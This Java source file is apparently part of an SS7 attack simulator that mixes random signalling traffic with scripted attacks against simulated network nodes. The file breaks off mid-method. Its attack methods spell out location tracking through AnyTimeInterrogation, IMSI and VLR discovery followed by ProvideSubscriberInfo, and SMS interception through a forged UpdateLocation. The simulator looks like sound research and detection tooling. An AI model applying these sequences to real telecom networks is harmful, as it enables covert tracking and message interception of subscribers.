package org.mobicents.protocols.ss7.tools.simulator;

import org.mobicents.protocols.ss7.map.MAPParameterFactoryImpl;
import org.mobicents.protocols.ss7.map.api.MAPParameterFactory;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
import org.mobicents.protocols.ss7.map.primitives.IMSIImpl;
import org.mobicents.protocols.ss7.tools.simulator.common.AttackConfigurationData;
import org.mobicents.protocols.ss7.tools.simulator.management.AttackTesterHost;
import org.mobicents.protocols.ss7.tools.simulator.management.Subscriber;
import org.mobicents.protocols.ss7.tools.simulator.management.SubscriberManager;

import java.util.Random;

/**
 * @author Kristoffer Jensen
 */
public class AttackSimulationOrganizer implements Stoppable {
    private Random random;
    private boolean simpleSimulation;

    private SimpleAttackGoal simpleAttackGoal;

    private int chanceOfAttack;
    private int numberOfSubscribers;

    private SubscriberManager subscriberManager;

    private AttackTesterHost mscAmscB;
    private AttackTesterHost mscBmscA;

    private AttackTesterHost mscAhlrA;
    private AttackTesterHost hlrAmscA;

    private AttackTesterHost mscAsmscA;
    private AttackTesterHost smscAmscA;

    private AttackTesterHost mscAvlrA;
    private AttackTesterHost vlrAmscA;

    private AttackTesterHost smscAhlrA;
    private AttackTesterHost hlrAsmscA;

    private AttackTesterHost hlrAvlrA;
    private AttackTesterHost vlrAhlrA;

    private AttackTesterHost sgsnAhlrA;
    private AttackTesterHost hlrAsgsnA;

    private AttackTesterHost gsmscfAhlrA;
    private AttackTesterHost hlrAgsmscfA;

    private AttackTesterHost gsmscfAvlrA;
    private AttackTesterHost vlrAgsmscfA;

    private AttackTesterHost attackerBmscA;
    private AttackTesterHost mscAattackerB;

    private AttackTesterHost attackerBhlrA;
    private AttackTesterHost hlrAattackerB;

    private AttackTesterHost attackerBsmscA;
    private AttackTesterHost smscAattackerB;

    private AttackTesterHost attackerBvlrA;
    private AttackTesterHost vlrAattackerB;

    private AttackTesterHost isupClient;
    private AttackTesterHost isupServer;

    public AttackSimulationOrganizer(String simulatorHome, boolean simpleSimulation, String simpleAttackGoal, int numberOfSubscribers, int chanceOfAttack) {
        this.random = new Random(System.currentTimeMillis());
        this.simpleSimulation = simpleSimulation;
        this.numberOfSubscribers = numberOfSubscribers;
        this.chanceOfAttack = chanceOfAttack;

        MAPParameterFactory mapParameterFactory = new MAPParameterFactoryImpl();

        ISDNAddressString defaultMscAddress = mapParameterFactory.createISDNAddressString(
                AddressNature.international_number,
                NumberingPlan.ISDN,
                AttackConfigurationData.MSC_A_NUMBER);
        ISDNAddressString defaultHlrAddress = mapParameterFactory.createISDNAddressString(
                AddressNature.international_number,
                NumberingPlan.ISDN,
                AttackConfigurationData.HLR_A_NUMBER);
        ISDNAddressString defaultVlrAddress = mapParameterFactory.createISDNAddressString(
                AddressNature.international_number,
                NumberingPlan.ISDN,
                AttackConfigurationData.VLR_A_NUMBER);

        this.subscriberManager = new SubscriberManager(defaultMscAddress, defaultVlrAddress, defaultHlrAddress);
        this.subscriberManager.createRandomSubscribers(numberOfSubscribers);

        if (this.simpleSimulation) {
            //this.isupClient = new AttackTesterHost("ISUP_CLIENT", simulatorHome, AttackTesterHost.AttackNode.ISUP_CLIENT, this);
            //this.isupServer = new AttackTesterHost("ISUP_SERVER", simulatorHome, AttackTesterHost.AttackNode.ISUP_SERVER, this);

            switch(simpleAttackGoal) {
                case "location:ati":
                    this.simpleAttackGoal = SimpleAttackGoal.LOCATION_ATI;
                    this.attackerBhlrA = new AttackTesterHost("ATTACKER_B_HLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_HLR_A, this);
                    this.hlrAattackerB = new AttackTesterHost("HLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.HLR_A_ATTACKER_B, this);
                    break;
                case "location:psi":
                    this.simpleAttackGoal = SimpleAttackGoal.LOCATION_PSI;
                    this.attackerBhlrA = new AttackTesterHost("ATTACKER_B_HLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_HLR_A, this);
                    this.hlrAattackerB = new AttackTesterHost("HLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.HLR_A_ATTACKER_B, this);
                    this.attackerBvlrA = new AttackTesterHost("ATTACKER_B_VLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_VLR_A, this);
                    this.vlrAattackerB = new AttackTesterHost("VLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.VLR_A_ATTACKER_B, this);
                    break;
                case "intercept:sms":
                    this.simpleAttackGoal = SimpleAttackGoal.INTERCEPT_SMS;
                    this.attackerBhlrA = new AttackTesterHost("ATTACKER_B_HLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_HLR_A, this);
                    this.hlrAattackerB = new AttackTesterHost("HLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.HLR_A_ATTACKER_B, this);
                    this.smscAhlrA = new AttackTesterHost("SMSC_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.SMSC_A_HLR_A, this);
                    this.hlrAsmscA = new AttackTesterHost("HLR_A_SMSC_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_SMSC_A, this);
                    this.mscAsmscA = new AttackTesterHost("MSC_A_SMSC_A", simulatorHome, AttackTesterHost.AttackNode.MSC_A_SMSC_A, this);
                    this.smscAmscA = new AttackTesterHost("SMSC_A_MSC_A", simulatorHome, AttackTesterHost.AttackNode.SMSC_A_MSC_A, this);
                    break;

                default:
                    System.out.println("ERROR: Unknown simple attack goal: " + simpleAttackGoal);
                    System.exit(-1);
            }

        } else {
            this.mscAmscB = new AttackTesterHost("MSC_A_MSC_B", simulatorHome, AttackTesterHost.AttackNode.MSC_A_MSC_B, this);
            this.mscBmscA = new AttackTesterHost("MSC_B_MSC_A", simulatorHome, AttackTesterHost.AttackNode.MSC_B_MSC_A, this);

            this.mscAhlrA = new AttackTesterHost("MSC_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.MSC_A_HLR_A, this);
            this.hlrAmscA = new AttackTesterHost("HLR_A_MSC_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_MSC_A, this);

            this.mscAsmscA = new AttackTesterHost("MSC_A_SMSC_A", simulatorHome, AttackTesterHost.AttackNode.MSC_A_SMSC_A, this);
            this.smscAmscA = new AttackTesterHost("SMSC_A_MSC_A", simulatorHome, AttackTesterHost.AttackNode.SMSC_A_MSC_A, this);

            this.mscAvlrA = new AttackTesterHost("MSC_A_VLR_A", simulatorHome, AttackTesterHost.AttackNode.MSC_A_VLR_A, this);
            this.vlrAmscA = new AttackTesterHost("VLR_A_MSC_A", simulatorHome, AttackTesterHost.AttackNode.VLR_A_MSC_A, this);

            this.smscAhlrA = new AttackTesterHost("SMSC_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.SMSC_A_HLR_A, this);
            this.hlrAsmscA = new AttackTesterHost("HLR_A_SMSC_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_SMSC_A, this);

            this.hlrAvlrA = new AttackTesterHost("HLR_A_VLR_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_VLR_A, this);
            this.vlrAhlrA = new AttackTesterHost("VLR_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.VLR_A_HLR_A, this);

            this.sgsnAhlrA = new AttackTesterHost("SGSN_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.SGSN_A_HLR_A, this);
            this.hlrAsgsnA = new AttackTesterHost("HLR_A_SGSN_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_SGSN_A, this);

            this.gsmscfAhlrA = new AttackTesterHost("GSMSCF_A_HLR_A", simulatorHome, AttackTesterHost.AttackNode.GSMSCF_A_HLR_A, this);
            this.hlrAgsmscfA = new AttackTesterHost("HLR_A_GSMSCF_A", simulatorHome, AttackTesterHost.AttackNode.HLR_A_GSMSCF_A, this);

            this.gsmscfAvlrA = new AttackTesterHost("GSMSCF_A_VLR_A", simulatorHome, AttackTesterHost.AttackNode.GSMSCF_A_VLR_A, this);
            this.vlrAgsmscfA = new AttackTesterHost("VLR_A_GSMSCF_A", simulatorHome, AttackTesterHost.AttackNode.VLR_A_GSMSCF_A, this);

            this.attackerBmscA = new AttackTesterHost("ATTACKER_B_MSC_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_MSC_A, this);
            this.mscAattackerB = new AttackTesterHost("MSC_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.MSC_A_ATTACKER_B, this);

            this.attackerBhlrA = new AttackTesterHost("ATTACKER_B_HLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_HLR_A, this);
            this.hlrAattackerB = new AttackTesterHost("HLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.HLR_A_ATTACKER_B, this);

            this.attackerBsmscA = new AttackTesterHost("ATTACKER_B_SMSC_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_SMSC_A, this);
            this.smscAattackerB = new AttackTesterHost("SMSC_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.SMSC_A_ATTACKER_B, this);

            this.attackerBvlrA = new AttackTesterHost("ATTACKER_B_VLR_A", simulatorHome, AttackTesterHost.AttackNode.ATTACKER_B_VLR_A, this);
            this.vlrAattackerB = new AttackTesterHost("VLR_A_ATTACKER_B", simulatorHome, AttackTesterHost.AttackNode.VLR_A_ATTACKER_B, this);
        }
    }

    public AttackTesterHost getMscAmscB() {
        return mscAmscB;
    }

    public AttackTesterHost getMscBmscA() {
        return mscBmscA;
    }

    public AttackTesterHost getMscAhlrA() {
        return mscAhlrA;
    }

    public AttackTesterHost getHlrAmscA() {
        return hlrAmscA;
    }

    public AttackTesterHost getMscAsmscA() {
        return mscAsmscA;
    }

    public AttackTesterHost getSmscAmscA() {
        return smscAmscA;
    }

    public AttackTesterHost getMscAvlrA() {
        return mscAvlrA;
    }

    public AttackTesterHost getVlrAmscA() {
        return vlrAmscA;
    }

    public AttackTesterHost getSmscAhlrA() {
        return smscAhlrA;
    }

    public AttackTesterHost getHlrAsmscA() {
        return hlrAsmscA;
    }

    public AttackTesterHost getHlrAvlrA() {
        return hlrAvlrA;
    }

    public AttackTesterHost getVlrAhlrA() {
        return vlrAhlrA;
    }

    public AttackTesterHost getSgsnAhlrA() {
        return sgsnAhlrA;
    }

    public AttackTesterHost getHlrAsgsnA() {
        return hlrAsgsnA;
    }

    public AttackTesterHost getGsmscfAhlrA() {
        return gsmscfAhlrA;
    }

    public AttackTesterHost getHlrAgsmscfA() {
        return hlrAgsmscfA;
    }

    public AttackTesterHost getGsmscfAvlrA() {
        return gsmscfAvlrA;
    }

    public AttackTesterHost getVlrAgsmscfA() {
        return vlrAgsmscfA;
    }

    public AttackTesterHost getAttackerBmscA() {
        return attackerBmscA;
    }

    public AttackTesterHost getMscAattackerB() {
        return mscAattackerB;
    }

    public AttackTesterHost getAttackerBhlrA() {
        return attackerBhlrA;
    }

    public AttackTesterHost getHlrAattackerB() {
        return hlrAattackerB;
    }

    public AttackTesterHost getAttackerBsmscA() {
        return attackerBsmscA;
    }

    public AttackTesterHost getSmscAattackerB() {
        return smscAattackerB;
    }

    public AttackTesterHost getAttackerBvlrA() {
        return attackerBvlrA;
    }

    public AttackTesterHost getVlrAattackerB() {
        return vlrAattackerB;
    }

    public SubscriberManager getSubscriberManager() {
        return subscriberManager;
    }

    private void startAttackSimulationHosts() {
        if (this.simpleSimulation) {
            switch(this.simpleAttackGoal) {
                case LOCATION_ATI:
                    this.attackerBhlrA.start();
                    this.hlrAattackerB.start();
                    break;
                case LOCATION_PSI:
                    this.attackerBhlrA.start();
                    this.hlrAattackerB.start();
                    this.attackerBvlrA.start();
                    this.vlrAattackerB.start();
                    break;
                case INTERCEPT_SMS:
                    this.attackerBhlrA.start();
                    this.hlrAattackerB.start();
                    this.smscAhlrA.start();
                    this.hlrAsmscA.start();
                    this.mscAsmscA.start();
                    this.smscAmscA.start();
                    break;
            }
        } else {
            this.mscAmscB.start();
            this.mscBmscA.start();

            this.mscAhlrA.start();
            this.hlrAmscA.start();

            this.mscAsmscA.start();
            this.smscAmscA.start();

            this.mscAvlrA.start();
            this.vlrAmscA.start();

            this.smscAhlrA.start();
            this.hlrAsmscA.start();

            this.hlrAvlrA.start();
            this.vlrAhlrA.start();

            this.sgsnAhlrA.start();
            this.hlrAsgsnA.start();

            this.gsmscfAhlrA.start();
            this.hlrAgsmscfA.start();

            this.gsmscfAvlrA.start();
            this.vlrAgsmscfA.start();

            this.attackerBmscA.start();
            this.mscAattackerB.start();

            this.attackerBhlrA.start();
            this.hlrAattackerB.start();

            this.attackerBsmscA.start();
            this.smscAattackerB.start();

            this.attackerBvlrA.start();
            this.vlrAattackerB.start();
        }
    }

    private boolean waitForM3UALinks() {
        while (true) {
            try {
                Thread.sleep(50);
                if(!this.simpleSimulation) {
                    if (mscAmscB.getM3uaMan().getState().contains("ACTIVE") &&
                            mscAhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            mscAsmscA.getM3uaMan().getState().contains("ACTIVE") &&
                            mscAvlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            smscAhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            hlrAvlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            sgsnAhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            gsmscfAhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            gsmscfAvlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            attackerBmscA.getM3uaMan().getState().contains("ACTIVE") &&
                            attackerBhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                            attackerBsmscA.getM3uaMan().getState().contains("ACTIVE") &&
                            attackerBvlrA.getM3uaMan().getState().contains("ACTIVE"))
                        return true;
                } else {
                    switch(this.simpleAttackGoal) {
                        case LOCATION_ATI:
                            if(this.attackerBhlrA.getM3uaMan().getState().contains("ACTIVE"))
                                return true;
                            break;
                        case LOCATION_PSI:
                            if(this.attackerBhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                                    this.attackerBvlrA.getM3uaMan().getState().contains("ACTIVE"))
                                return true;
                            break;
                        case INTERCEPT_SMS:
                            if(this.attackerBhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                                    this.smscAhlrA.getM3uaMan().getState().contains("ACTIVE") &&
                                    this.mscAsmscA.getM3uaMan().getState().contains("ACTIVE"))
                                return true;
                            break;
                    }
                    //if (this.isupClient.getM3uaMan().getState().contains("ACTIVE") &&
                    //        this.isupServer.getM3uaMan().getState().contains("ACTIVE"))
                    //    return true;
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
                return false;
            }
        }
    }

    private boolean testerHostsNeedQuit() {
        if(simpleSimulation) {
            switch(this.simpleAttackGoal) {
                case LOCATION_ATI:
                    return this.attackerBhlrA.isNeedQuit() || this.hlrAattackerB.isNeedQuit();
                case LOCATION_PSI:
                    return this.attackerBhlrA.isNeedQuit() || this.hlrAattackerB.isNeedQuit() ||
                            this.attackerBvlrA.isNeedQuit() || this.vlrAattackerB.isNeedQuit();
                case INTERCEPT_SMS:
                    return this.attackerBhlrA.isNeedQuit() || this.hlrAattackerB.isNeedQuit() ||
                            this.smscAhlrA.isNeedQuit() || this.hlrAsmscA.isNeedQuit() ||
                            this.mscAsmscA.isNeedQuit() || this.smscAmscA.isNeedQuit();
            }
            return false;
            //return this.isupClient.isNeedQuit() || this.isupServer.isNeedQuit();
        } else {
            return this.mscAmscB.isNeedQuit() || this.mscBmscA.isNeedQuit() ||
                    this.mscAhlrA.isNeedQuit() || this.hlrAmscA.isNeedQuit() ||
                    this.mscAsmscA.isNeedQuit() || this.smscAmscA.isNeedQuit() ||
                    this.mscAvlrA.isNeedQuit() || this.vlrAmscA.isNeedQuit() ||
                    this.smscAhlrA.isNeedQuit() || this.hlrAsmscA.isNeedQuit() ||
                    this.hlrAvlrA.isNeedQuit() || this.vlrAhlrA.isNeedQuit() ||
                    this.sgsnAhlrA.isNeedQuit() || this.hlrAsgsnA.isNeedQuit() ||
                    this.gsmscfAhlrA.isNeedQuit() || this.hlrAgsmscfA.isNeedQuit() ||
                    this.gsmscfAvlrA.isNeedQuit() || this.vlrAgsmscfA.isNeedQuit() ||
                    this.attackerBmscA.isNeedQuit() || this.mscAattackerB.isNeedQuit() ||
                    this.attackerBhlrA.isNeedQuit() || this.hlrAattackerB.isNeedQuit() ||
                    this.attackerBsmscA.isNeedQuit() || this.smscAattackerB.isNeedQuit() ||
                    this.attackerBvlrA.isNeedQuit() || this.vlrAattackerB.isNeedQuit();
        }
    }

    private void testerHostsExecuteCheckStore() {
        if (simpleSimulation) {
            switch(this.simpleAttackGoal) {
                case LOCATION_ATI:
                    this.attackerBhlrA.execute();
                    this.hlrAattackerB.execute();
                    this.attackerBhlrA.checkStore();
                    this.hlrAattackerB.checkStore();
                    break;
                case LOCATION_PSI:
                    this.attackerBhlrA.execute();
                    this.hlrAattackerB.execute();
                    this.attackerBvlrA.execute();
                    this.vlrAattackerB.execute();
                    this.attackerBhlrA.checkStore();
                    this.hlrAattackerB.checkStore();
                    this.attackerBvlrA.checkStore();
                    this.vlrAattackerB.checkStore();
                    break;
                case INTERCEPT_SMS:
                    this.attackerBhlrA.execute();
                    this.hlrAattackerB.execute();
                    this.smscAhlrA.execute();
                    this.hlrAsmscA.execute();
                    this.mscAsmscA.execute();
                    this.smscAmscA.execute();

                    this.attackerBhlrA.checkStore();
                    this.hlrAattackerB.checkStore();
                    this.smscAhlrA.checkStore();
                    this.hlrAsmscA.checkStore();
                    this.mscAsmscA.checkStore();
                    this.smscAmscA.checkStore();
                    break;
            }
            //this.isupClient.execute();
            //this.isupServer.execute();

            //this.isupClient.checkStore();
            //this.isupServer.checkStore();
        } else {
            this.mscAmscB.execute();
            this.mscBmscA.execute();
            this.mscAhlrA.execute();
            this.hlrAmscA.execute();
            this.mscAsmscA.execute();
            this.smscAmscA.execute();
            this.mscAvlrA.execute();
            this.vlrAmscA.execute();
            this.smscAhlrA.execute();
            this.hlrAsmscA.execute();
            this.hlrAvlrA.execute();
            this.vlrAhlrA.execute();
            this.sgsnAhlrA.execute();
            this.hlrAsgsnA.execute();
            this.gsmscfAhlrA.execute();
            this.hlrAgsmscfA.execute();
            this.gsmscfAvlrA.execute();
            this.vlrAgsmscfA.execute();
            this.attackerBmscA.execute();
            this.mscAattackerB.execute();
            this.attackerBhlrA.execute();
            this.hlrAattackerB.execute();
            this.attackerBsmscA.execute();
            this.smscAattackerB.execute();
            this.attackerBvlrA.execute();
            this.vlrAattackerB.execute();

            this.mscAmscB.checkStore();
            this.mscBmscA.checkStore();
            this.mscAhlrA.checkStore();
            this.hlrAmscA.checkStore();
            this.mscAsmscA.checkStore();
            this.smscAmscA.checkStore();
            this.mscAvlrA.checkStore();
            this.vlrAmscA.checkStore();
            this.smscAhlrA.checkStore();
            this.hlrAsmscA.checkStore();
            this.hlrAvlrA.checkStore();
            this.vlrAhlrA.checkStore();
            this.sgsnAhlrA.checkStore();
            this.hlrAsgsnA.checkStore();
            this.gsmscfAhlrA.checkStore();
            this.hlrAgsmscfA.checkStore();
            this.gsmscfAvlrA.checkStore();
            this.vlrAgsmscfA.checkStore();
            this.attackerBmscA.checkStore();
            this.mscAattackerB.checkStore();
            this.attackerBhlrA.checkStore();
            this.hlrAattackerB.checkStore();
            this.attackerBsmscA.checkStore();
            this.smscAattackerB.checkStore();
            this.attackerBvlrA.checkStore();
            this.vlrAattackerB.checkStore();
        }
    }

    public void start() {

        startAttackSimulationHosts();

        if (!waitForM3UALinks())
            return;

        int sleepTime = 50;

        int msgNum = 0;

        while (true) {
            try {
                sleepTime = this.random.nextInt((1000 - 100) + 1) + 100;
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                e.printStackTrace();
                break;
            }

            if(this.testerHostsNeedQuit())
                break;

            this.testerHostsExecuteCheckStore();

            if(simpleSimulation) {
                switch (this.simpleAttackGoal) {
                    case LOCATION_ATI:
                        this.attackLocationAti();
                        break;
                    case LOCATION_PSI:
                        this.attackLocationPsi();
                        break;
                    case INTERCEPT_SMS:
                        this.attackInterceptSms();
                        break;
                }
                break;
            } else {
                this.generateTraffic();
            }

            msgNum++;
        }
    }

    private void generateTraffic() {
        boolean generateNoise = this.random.nextInt(100) >= this.chanceOfAttack;

        if(generateNoise)
            this.generateNoise();
        else
            this.generateAttack();
    }

    private void generateNoise() {
       this.sendRandomMessage();
    }

    private void generateAttack() {
        int numberOfAttacks = 3;
        int randomAttack = this.random.nextInt(numberOfAttacks);

        switch(randomAttack) {
            case 0:
                this.attackLocationAti();
                break;
            case 1:
                this.attackLocationPsi();
                break;
            case 2:
                this.attackInterceptSms();
                break;
        }
    }

    private void modifyCallingPartyAddressDigits(AttackTesterHost attackTesterHost, String cgGT) {
        attackTesterHost.getSccpMan().setCallingPartyAddressDigits(cgGT);
    }

    private void sendRandomIsupMessage(int num) {
        switch(num) {
            case 0:
                this.isupClient.getTestAttackClient().performIsupIAM();
        }
    }

    private void sendRandomMessage() {
        int numberOfAvailableMessages = 36;
        int randomMessage = this.random.nextInt(numberOfAvailableMessages);

        switch (randomMessage) {
            case 0:
                this.performMoSMS();
                break;
            case 1:
                this.performMtSMS();
                break;
            case 2:
                this.performUpdateLocation();
                break;
            case 3:
                this.performCancelLocation();
                break;
            case 4:
                this.performSendIdentification();
                break;
            case 5:
                this.performPurgeMS();
                break;
            case 6:
                this.performUpdateGPRSLocation();
                break;
            case 7:
                this.performCheckIMEI();
                break;
            case 8:
                this.performInsertSubscriberData();
                break;
            case 9:
                this.performDeleteSubscriberData();
                break;
            case 10:
                this.performForwardCheckSSIndication();
                break;
            case 11:
                this.performRestoreData();
                break;
            case 12:
                this.performAnyTimeInterrogation();
                break;
            case 13:
                this.performProvideSubscriberInfo();
                break;
            case 14:
                this.performActivateTraceMode();
                break;
            case 15:
                this.performSendIMSI();
                break;
            case 16:
                this.performSendRoutingInformation();
                break;
            case 17:
                this.performProvideRoamingNumber();
                break;
            case 18:
                this.performRegisterSS();
                break;
            case 19:
                this.performEraseSS();
                break;
            case 20:
                this.performActivateSS();
                break;
            case 21:
                this.performDeactivateSS();
                break;
            case 22:
                this.performInterrogateSS();
                break;
            case 23:
                this.performRegisterPassword();
                break;
            case 24:
                this.performGetPassword();
                break;
            case 25:
                this.performProcessUnstructuredSSRequest();
                break;
            case 26:
                this.performUnstructuredSSRequest();
                break;
            case 27:
                this.performUnstructuredSSNotify();
                break;
            case 28:
                this.performSendRoutingInfoForSM();
                break;
            case 29:
                this.performMoForwardSM();
                break;
            case 30:
                this.performReportSMDeliveryStatus();
                break;
            case 31:
                this.performReadyForSM();
                break;
            case 32:
                this.performAlertServiceCentre();
                break;
            case 33:
                this.performInformServiceCentre();
                break;
            case 34:
                this.performMtForwardSM();
                break;
            case 35:
                this.performSendRoutingInfoForGPRS();
                break;

            default:
                break;
        }
    }

    private void attackLocationAti() {
        Subscriber subscriber = this.getSubscriberManager().getRandomSubscriber();
        this.attackerBhlrA.getTestAttackClient().performATI(subscriber.getMsisdn().getAddress());

        while(!this.attackerBhlrA.gotAtiResponse()) {
            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                return;
            }
        }

        AnyTimeInterrogationResponse atiResponse = this.attackerBhlrA.getTestAttackClient().getLastAtiResponse();
    }

    private void attackLocationPsi() {
        System.out.println("-----------STARTING LOCATION PSI ATTACK-----------");

        Subscriber subscriber = this.getSubscriberManager().getRandomSubscriber();

        //Get necessary information from request, use in next message.
        this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(),
                this.hlrAattackerB.getTestAttackServer().getServiceCenterAddress());

        while(!this.attackerBhlrA.gotSRIForSMResponse()) {
            try{
                Thread.sleep(50);
            } catch (InterruptedException e) {
                System.exit(50);
            }
        }

        SendRoutingInfoForSMResponse sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
        this.attackerBhlrA.getTestAttackClient().clearLastSRIForSMResponse();

        IMSI victimImsi = sriResponse.getIMSI();
        String victimVlrAddress = sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress();

        this.attackerBvlrA.getConfigurationData().getMapConfigurationData().setRemoteAddressDigits(victimVlrAddress);
        this.attackerBvlrA.getTestAttackClient().performProvideSubscriberInfoRequest(victimImsi);

        while(!this.attackerBvlrA.gotPSIResponse()) {
            try{
                Thread.sleep(50);
            } catch (InterruptedException e) {
                System.exit(50);
            }
        }

        System.out.println("-----------GOT PSI RESPONSE-----------");

        ProvideSubscriberInfoResponse psiResponse = this.attackerBvlrA.getTestAttackClient().getLastPsiResponse();
        this.attackerBvlrA.getTestAttackClient().clearLastPsiResponse();

        System.out.println(psiResponse.toString());

        //Location information aquired.
    }

    private void attackInterceptSms() {
        MAPParameterFactory mapParameterFactory = this.attackerBhlrA.getMapMan().getMAPStack().getMAPProvider().getMAPParameterFactory();
        Subscriber subscriber = this.getSubscriberManager().getRandomSubscriber();

        this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());

        while(!this.smscAhlrA.gotSRIForSMResponse()) {
            try {
                Thread.sleep(50);
            } catch(InterruptedException e) {
                System.exit(50);
            }
        }

        SendRoutingInfoForSMResponse sriResponse = this.smscAhlrA.getTestAttackClient().getLastSRIForSMResponse();
        this.smscAhlrA.getTestAttackClient().clearLastSRIForSMResponse();
        this.smscAmscA.getTestAttackServer().performMtForwardSM("SMS Message", sriResponse.getIMSI().getData(), sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress(), this.getSubscriberManager().getRandomSubscriber().getMsisdn().getAddress());

        this.attackerBhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());

        while(!this.smscAhlrA.gotSRIForSMResponse()) {
            try {
                Thread.sleep(50);
            } catch(InterruptedException e) {
                System.exit(50);
            }
        }

        sriResponse = this.attackerBhlrA.getTestAttackClient().getLastSRIForSMResponse();
        this.attackerBhlrA.getTestAttackClient().clearLastSRIForSMResponse();

        ISDNAddressString newMscAddress = mapParameterFactory.createISDNAddressString(
                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getAddressNature(),
                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getNumberingPlan(),
                this.attackerBhlrA.getConfigurationData().getSccpConfigurationData().getCallingPartyAddressDigits());
        ISDNAddressString newVlrAddress = mapParameterFactory.createISDNAddressString(
                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getAddressNature(),
                this.attackerBhlrA.getConfigurationData().getTestAttackClientConfigurationData().getNumberingPlan(),
                this.attackerBhlrA.getConfigurationData().getSccpConfigurationData().getCallingPartyAddressDigits());

        this.attackerBhlrA.getTestAttackClient().performUpdateLocationRequest(sriResponse.getIMSI(), newMscAddress, newVlrAddress);

        try {
            Thread.sleep(1000);
        } catch(InterruptedException e) {
            System.exit(50);
        }

        this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM(subscriber.getMsisdn().getAddress(), this.hlrAsmscA.getConfigurationData().getTestAttackServerConfigurationData().getServiceCenterAddress());

        while(!this.smscAhlrA.gotSRIForSMResponse()) {
            try {
                Thread.sleep(50);
            } catch(InterruptedException e) {
                System.exit(50);
            }
        }

        sriResponse = this.smscAhlrA.getTestAttackClient().getLastSRIForSMResponse();
        this.smscAhlrA.getTestAttackClient().clearLastSRIForSMResponse();
        System.out.println("Got SRI after successful attack: VLR: " + sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber() + ". MSC: " + sriResponse.getLocationInfoWithLMSI().getAdditionalNumber().getMSCNumber().getAddress());
        this.smscAmscA.getTestAttackServer().performMtForwardSM("SMS Message", sriResponse.getIMSI().getData(), sriResponse.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress(), this.getSubscriberManager().getRandomSubscriber().getMsisdn().getAddress());
    }

    private void performMoSMS() {
        Subscriber originator = this.subscriberManager.getRandomSubscriber();
        Subscriber destination = this.subscriberManager.getRandomSubscriber();

        String origIsdnNumber = originator.getMsisdn().getAddress();
        String destIsdnNumber = destination.getMsisdn().getAddress();

        this.mscAsmscA.getTestAttackClient().performMoForwardSM("SMS Message", destIsdnNumber, origIsdnNumber);
    }

    private void performMtSMS() {
        Subscriber destination = this.subscriberManager.getRandomSubscriber();

        String destIsdnNumber = destination.getMsisdn().getAddress();

        this.smscAhlrA.getTestAttackClient().performSendRoutingInfoForSM(destIsdnNumber,
                hlrAsmscA.getConfigurationData().getSccpConfigurationData().getCallingPartyAddressDigits());
    }

    private void performUpdateLocation() {
        this.vlrAhlrA.getTestAttackServer().performUpdateLocation();
    }

    private void performCancelLocation() {
        this.hlrAvlrA.getTestAttackClient().performCancelLocation();
    }

    private void performSendIdentification() {
        //this.vlrAvlrB.getTestAttackClient().performSendIdentification();
        //this.vlrBvlrA.getTestAttackServer().performSendIdentification();
    }

    private void performPurgeMS() {
        this.vlrAhlrA.getTestAttackServer().performPurgeMS();
    }

    private void performUpdateGPRSLocation() {
